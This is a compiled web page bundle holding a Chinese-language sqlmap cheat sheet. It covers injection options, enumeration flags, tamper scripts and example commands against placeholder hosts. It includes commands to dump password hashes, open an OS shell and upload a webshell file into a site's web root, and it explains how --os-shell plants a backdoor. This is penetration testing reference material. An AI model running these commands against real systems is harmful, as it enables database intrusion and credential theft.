import{_ as n}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as t,c as l,a,b as r,d as i,e as s,r as p}from"./app.ed2888ea.js";const o={},c=s(`<details class="custom-container details"><summary>当给SQLmap一个URL它会干些什么？</summary><p>1）判断可注入的参数</p><p>2）判断可以用哪种SQL注入技术来注入</p><p>3）识别出哪种数据库</p><p>4）根据用户选择，读取哪些数据</p></details><h2 id="清除缓存" tabindex="-1"><a class="header-anchor" href="#清除缓存" aria-hidden="true">#</a> 清除缓存</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">--purge</span>         <span class="token comment">#清除历史缓存</span>
--flush-session <span class="token comment">#清除上次扫描的缓存</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="目标" tabindex="-1"><a class="header-anchor" href="#目标" aria-hidden="true">#</a> 目标</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">-d</span>	<span class="token comment">#直连数据库，&quot;mysql://root:root@192.168.0.8:3306/testdb&quot;</span>
<span class="token parameter variable">-u</span>	<span class="token comment">#指定目标URL</span>
<span class="token parameter variable">-r</span>	<span class="token comment">#从文件中读取 HTTP 请求</span>
<span class="token parameter variable">-l</span>	<span class="token comment">#从Burp代理日志文件中解析目标地址</span>
<span class="token parameter variable">-m</span>	<span class="token comment">#从文本文件中批量获取目标</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="注入技术" tabindex="-1"><a class="header-anchor" href="#注入技术" aria-hidden="true">#</a> 注入技术</h2><p>以下选项用于调整特定 SQL 注入技术的测试方法</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">--technique</span><span class="token operator">=</span>EU  <span class="token comment">#使用的 SQL 注入技术（默认为“BEUSTQ”)  </span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><table><thead><tr><th style="text-align:left;">选项</th><th style="text-align:left;">注入技术</th></tr></thead><tbody><tr><td style="text-align:left;">B</td><td style="text-align:left;">Boolean-based blind SQL injection（布尔型盲注）</td></tr><tr><td style="text-align:left;">E</td><td style="text-align:left;">Error-based SQL injection（报错型注入）</td></tr><tr><td style="text-align:left;">U</td><td style="text-align:left;">UNION query SQL injection（联合查询注入）</td></tr><tr><td style="text-align:left;">S</td><td style="text-align:left;">Stacked queries SQL injection（堆查询注入）</td></tr><tr><td style="text-align:left;">T</td><td style="text-align:left;">Time-based blind SQL injection（时间型盲注）</td></tr><tr><td style="text-align:left;">Q</td><td style="text-align:left;">inline Query injection（内联查询注入）</td></tr></tbody></table><h2 id="输出信息的详细程度" tabindex="-1"><a class="header-anchor" href="#输出信息的详细程度" aria-hidden="true">#</a> <strong>输出信息的详细程度</strong></h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">-v</span>  <span class="token comment">#共7个级别(0~6)，默认为1，可以用-vv代替-v 2,推荐使用这种方法</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><strong>0</strong>：只输出 Python 出错回溯信息，错误和关键信息</li><li><strong>1</strong>：增加输出普通信息和警告信息</li><li><strong>2</strong>：增加输出调试信息</li><li><strong>3</strong>：增加输出已注入的 payloads</li><li><strong>4</strong>：增加输出 HTTP 请求</li><li><strong>5</strong>：增加输出 HTTP 响应头</li><li><strong>6</strong>：增加输出 HTTP 响应内容</li></ul><h2 id="请求" tabindex="-1"><a class="header-anchor" href="#请求" aria-hidden="true">#</a> 请求</h2><p>指定连接目标地址的方式</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">--method</span><span class="token operator">=</span>METHOD     <span class="token comment">#强制使用提供的 HTTP 方法（例如：PUT）</span>
<span class="token parameter variable">--data</span><span class="token operator">=</span>DATA         <span class="token comment">#使用 POST 发送数据串；--data=&quot;id=1&amp;user=admin&quot;</span>
--param-del<span class="token operator">=</span><span class="token string">&quot;;&quot;</span>     <span class="token comment">#使用参数分隔符，--data=&quot;id=1;user=admin&quot;</span>
<span class="token parameter variable">--cookie</span><span class="token operator">=</span>COOKIE     <span class="token comment">#指定 HTTP Cookie ，--cookie &quot;id=11&quot; --level 2</span>
--drop-set-cookie   <span class="token comment">#忽略 HTTP 响应中的 Set-Cookie 参数</span>
--user-agent<span class="token operator">=</span>AGENT  <span class="token comment">#指定 HTTP User-Agent</span>
--random-agent      <span class="token comment">#使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个</span>
<span class="token parameter variable">--referer</span><span class="token operator">=</span>REFERER   <span class="token comment">#指定 HTTP Referer</span>
<span class="token parameter variable">-H</span> HEADER           <span class="token comment">#设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;）</span>
<span class="token parameter variable">--headers</span><span class="token operator">=</span>HEADERS   <span class="token comment">#设置额外的 HTTP 头参数,必须以换行符分隔（例如：&quot;Accept-Language: fr\\nETag: 123&quot;）</span>
<span class="token parameter variable">--delay</span><span class="token operator">=</span><span class="token number">10</span>          <span class="token comment">#设置每个 HTTP 请求的延迟秒数</span>
--safe-freq<span class="token operator">=</span>SAFE    <span class="token comment">#每访问两次给定的合法 URL 才发送一次测试请求</span>

--time-sec<span class="token operator">=</span>TIMESEC  <span class="token comment">#设置延时注入的时间（默认为 5）</span>
--second-order<span class="token operator">=</span>S<span class="token punctuation">..</span>  <span class="token comment">#设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="注入" tabindex="-1"><a class="header-anchor" href="#注入" aria-hidden="true">#</a> 注入</h2><p>以下选项用于指定要测试的参数 ，提供自定义注入 payloads 和篡改参数的脚本。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">-p</span> TESTPARAMETER    	<span class="token comment">#指定需要测试的参数</span>
<span class="token parameter variable">--skip</span><span class="token operator">=</span>SKIP         	<span class="token comment">#指定要跳过的参数</span>
<span class="token parameter variable">--dbms</span><span class="token operator">=</span>DBMS         	<span class="token comment">#指定 DBMS 类型（例如：MySQL）</span>
<span class="token parameter variable">--os</span><span class="token operator">=</span>OS             	<span class="token comment">#指定 DBMS 服务器的操作系统类型</span>
<span class="token parameter variable">--prefix</span><span class="token operator">=</span>PREFIX     	<span class="token comment">#注入 payload 的前缀字符串</span>
<span class="token parameter variable">--suffix</span><span class="token operator">=</span>SUFFIX     	<span class="token comment">#注入 payload 的后缀字符串</span>
<span class="token parameter variable">--tamper</span><span class="token operator">=</span>TAMPER     	<span class="token comment">#用给定脚本修改注入数据</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="检测" tabindex="-1"><a class="header-anchor" href="#检测" aria-hidden="true">#</a> 检测</h2><p>sqlmap 使用的 payloads 直接从文本文件 xml/payloads.xml 中载入。</p><p>根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入；</p><p>你可以选择自己修改指定的 payload 用于检测。</p><div class="custom-container info"><p class="custom-container-title">检测level有5级，越高检测越全，默认为 1</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">--level</span> <span class="token number">1</span> <span class="token comment">#检测Get和Post </span>
<span class="token parameter variable">--level</span> <span class="token number">2</span> <span class="token comment">#检测HTTP Cookie </span>
<span class="token parameter variable">--level</span> <span class="token number">3</span> <span class="token comment">#检测User-Agent和Referer </span>
<span class="token parameter variable">--level</span> <span class="token number">4</span> <span class="token comment">#检测 </span>
<span class="token parameter variable">--level</span> <span class="token number">5</span> <span class="token comment">#检测 HOST 头 </span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></div><div class="custom-container info"><p class="custom-container-title">风险risk有3级，级别越高风险越大，默认为1</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token parameter variable">--risk</span> <span class="token number">2</span> <span class="token comment">#会在默认的检测上添加大量时间型盲注语句测试 </span>
<span class="token parameter variable">--risk</span> <span class="token number">3</span> <span class="token comment">#会在原基础上添加OR 类型的布尔型盲注 ，可能会update导致修改数据库</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></div><h2 id="枚举" tabindex="-1"><a class="header-anchor" href="#枚举" aria-hidden="true">#</a> 枚举</h2><p>以下选项用于获取数据库的信息，结构和数据表中的数据。</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>-a, <span class="token parameter variable">--all</span>          				<span class="token comment">#获取所有信息、数据</span>
-b, <span class="token parameter variable">--banner</span>        			<span class="token comment">#获取 DBMS banner,返回数据库的版本号</span>
--current-user          	<span class="token comment">#获取 DBMS 当前用户</span>
--current-db            	<span class="token comment">#获取 DBMS 当前数据库</span>
<span class="token parameter variable">--hostname</span>              	<span class="token comment">#获取 DBMS 服务器的主机名</span>
--is-dba                	<span class="token comment">#探测 DBMS 当前用户是否为 DBA（数据库管理员）</span>
<span class="token parameter variable">--users</span>                 	<span class="token comment">#枚举出 DBMS 所有用户</span>
<span class="token parameter variable">--passwords</span>             	<span class="token comment">#枚举出 DBMS 所有用户的密码哈希</span>
<span class="token parameter variable">--privileges</span>            	<span class="token comment">#枚举出 DBMS 所有用户特权级</span>
<span class="token parameter variable">--roles</span>                 	<span class="token comment">#枚举出 DBMS 所有用户角色</span>
<span class="token parameter variable">--dbs</span>                   	<span class="token comment">#枚举出 DBMS 所有数据库</span>
<span class="token parameter variable">--tables</span>                	<span class="token comment">#枚举出 DBMS 数据库中的所有表</span>
<span class="token parameter variable">--columns</span>               	<span class="token comment">#枚举出 DBMS 表中的所有列</span>
<span class="token parameter variable">--schema</span>                	<span class="token comment">#枚举出 DBMS 所有模式</span>
<span class="token parameter variable">--count</span>                 	<span class="token comment">#获取数据表数目</span>
<span class="token parameter variable">--dump</span>                  	<span class="token comment">#导出 DBMS 数据库表项</span>
<span class="token parameter variable">--stop</span> <span class="token number">10</span>               	<span class="token comment">#只取前10行数据</span>
<span class="token parameter variable">-D</span> DB                   	<span class="token comment">#指定要枚举的 DBMS 数据库</span>
<span class="token parameter variable">-T</span> TBL                  	<span class="token comment">#指定要枚举的 DBMS 数据表</span>
<span class="token parameter variable">-C</span> COL                  	<span class="token comment">#指定要枚举的 DBMS 数据列</span>
--sql-query<span class="token operator">=</span>QUERY       	<span class="token comment">#指定要执行的 SQL 语句</span>
--sql-shell             	<span class="token comment">#调出交互式 SQL shell</span>
--os-cmd             	    <span class="token comment">#在目标系统上执行系统命令</span>
--os-shell             	    <span class="token comment">#调出交互式 系统 shell</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="实战用例" tabindex="-1"><a class="header-anchor" href="#实战用例" aria-hidden="true">#</a> 实战用例</h2><h4 id="从文件读取http请求-get和post都可以" tabindex="-1"><a class="header-anchor" href="#从文件读取http请求-get和post都可以" aria-hidden="true">#</a> 从文件读取HTTP请求，GET和POST都可以</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-r</span> <span class="token string">&quot;burp.txt&quot;</span> <span class="token parameter variable">-p</span> <span class="token string">&quot;username&quot;</span>  <span class="token comment">#-p 指定存在注入的参数</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="cookie注入" tabindex="-1"><a class="header-anchor" href="#cookie注入" aria-hidden="true">#</a> Cookie注入</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;http://www.vuln.com&quot;</span> <span class="token parameter variable">--cookie</span> <span class="token string">&quot;id=11&quot;</span> <span class="token parameter variable">--level</span> <span class="token number">2</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="当防火墙-对请求速度做了限制" tabindex="-1"><a class="header-anchor" href="#当防火墙-对请求速度做了限制" aria-hidden="true">#</a> 当防火墙，对请求速度做了限制</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;http://www.vuln.com/post.php?id=1&quot;</span> <span class="token parameter variable">--delay</span><span class="token operator">=</span><span class="token number">10</span>
<span class="token comment">#在每个HTTP请求之间的延迟10秒</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="伪静态注入" tabindex="-1"><a class="header-anchor" href="#伪静态注入" aria-hidden="true">#</a> 伪静态注入</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqpmap  <span class="token parameter variable">-u</span> http://victim.com/id/666*.html <span class="token parameter variable">--dbs</span>  <span class="token comment">#在html扩展名前加个&#39;*&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="tamper脚本" tabindex="-1"><a class="header-anchor" href="#tamper脚本" aria-hidden="true">#</a> tamper脚本</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>apostrophemask          	<span class="token comment">#将单引号 url 编码</span>
apostrophenullencode    	<span class="token comment">#将单引号替换为宽字节 unicode 字符</span>
base64encode            	<span class="token comment">#base64 编码</span>
charencode              	<span class="token comment">#用 url 编码一次你的 payload</span>
charunicodeencode       	<span class="token comment">#用 unicode 编码 payload ，只编码非编码字符</span>
between						<span class="token comment">#将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</span>
bluecoat			<span class="token comment">#用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,38),d={href:"https://wooyun.js.org/drops/SQLMAP%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8.html",target:"_blank",rel:"noopener noreferrer"},m=s(`<h2 id="原理问题" tabindex="-1"><a class="header-anchor" href="#原理问题" aria-hidden="true">#</a> 原理问题</h2><details class="custom-container details"><summary>--os-shell的原理是什么？</summary><p>这个功能仅对MySQL、MSSQL、PosgreSQL有效</p><p>数据库用户有系统目录读写文件权限（dba权限）sqlmap 能够在数据库服务器上执行系统命令</p><p>原理就是上传一个upload木马后，再上传一个cmd shell； 当 --os-shell 退出后， 会调用后门脚本删除上传文件后，进行自删除。</p><p>在 MySQL 和 PostgreSQL 中，sqlmap 可以上传两个用户自定义函数</p><p>分别为 sys_exec() 和 sys_eval() 的共享库（二进制文件）</p><p>然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。</p><p>在 Microsoft SQL Server 中，sqlmap 会利用 xp_cmdshell 存储过程：</p><p>如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；</p><p>如果该存储过程不存在，sqlmap 则会重新创建它。</p><p>当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。</p><p>相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。</p><p>如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，</p><p>假如后端 DBMS 和 Web 服务器在同一台服务器上， 则仍可以通过利用 SELECT 语句中的 INTO OUTFILE，在 根目录可写目录中写shell</p></details><details class="custom-container details"><summary>udf提权</summary><p>此功能仅对 MySQL 或 PostgreSQL 有用</p><p>使用选项 --udf-inject 并按照说明进行操作即可；</p><p>如果需要，也可以使用 --shared-lib 选项通过命令行指定共享库的本地文件系统路径。</p><p>否则 sqlmap 会在运行时向你询问路径。</p></details><details class="custom-container details"><summary>访问文件系统</summary><p>仅对MySQL、MSSQL、PosgreSQL有效</p><p>数据库用户有目录读写文件权限 （DBA）</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> url --is-dba                                      <span class="token comment">#查看是否dba权限,必须为root权限</span>
sqlmap <span class="token parameter variable">-u</span> url --file-read <span class="token string">&quot;C:/Windows/win.ini&quot;</span>               <span class="token comment">#读取文件</span>
sqlmap <span class="token parameter variable">-u</span> url --file-write<span class="token operator">=</span>D:/shell.php --file-dest<span class="token operator">=</span>C:/www/shell.php <span class="token comment">#上传文件 (本地木马路径:目标网站目录)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details>`,4);function v(u,b){const e=p("ExternalLinkIcon");return t(),l("div",null,[c,a("p",null,[a("a",d,[r("自定义tamper"),i(e)])]),m])}const g=n(o,[["render",v],["__file","SQLmap.html.vue"]]);export{g as default};
